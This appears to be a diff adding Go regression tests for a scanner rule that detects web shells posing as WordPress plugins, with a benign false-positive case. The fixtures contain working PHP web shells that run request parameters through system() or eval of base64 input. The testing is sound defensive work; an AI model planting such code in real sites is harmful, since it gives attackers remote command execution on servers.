@@ -155,3 +155,51 @@ $payload = base64_decode('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe3N5c3RlbSgkX0dFVFsnYyddKT
 		t.Error("webshell_wp_fake_plugin regression: Plugin Name header followed by eval(base64_decode(...)) was not detected")
 	}
 }
+
+func TestWebshellWpFakePlugin_RequestIndirection(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	for _, malicious := range [][]byte{
+		[]byte(`<?php
+/*
+Plugin Name: Cache Helper
+*/
+$payload = base64_decode($_POST['payload']);
+@` + evalCallToken() + `$payload);
+`),
+		[]byte(`<?php
+/*
+Plugin Name: SEO Helper
+*/
+$cmd = $_REQUEST['cmd'];
+system($cmd);
+`),
+		[]byte(`<?php
+/*
+Plugin Name: Media Helper
+*/
+$x = trim($_GET['x']);
+system($x);
+$stored = base64_decode('Y29uZmln');
+`),
+	} {
+		if !hasRule(scanner.ScanContent(malicious, ".php"), "webshell_wp_fake_plugin") {
+			t.Errorf("webshell_wp_fake_plugin regression: request input executed through a local variable was not detected: %s", malicious)
+		}
+	}
+}
+
+func TestWebshellWpFakePlugin_RequestAndIndependentToolingIsLegit(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	legit := []byte(`<?php
+/*
+Plugin Name: Database Backup
+*/
+$archive = sanitize_file_name($_POST['archive']);
+$cmd = 'mysqldump --defaults-extra-file=' . escapeshellarg($defaults);
+$output = shell_exec($cmd);
+store_archive($archive, $output);
+`)
+	if hasRule(scanner.ScanContent(legit, ".php"), "webshell_wp_fake_plugin") {
+		t.Error("webshell_wp_fake_plugin FP: matched request handling near a shell command that consumes an independently built command")
+	}
+}
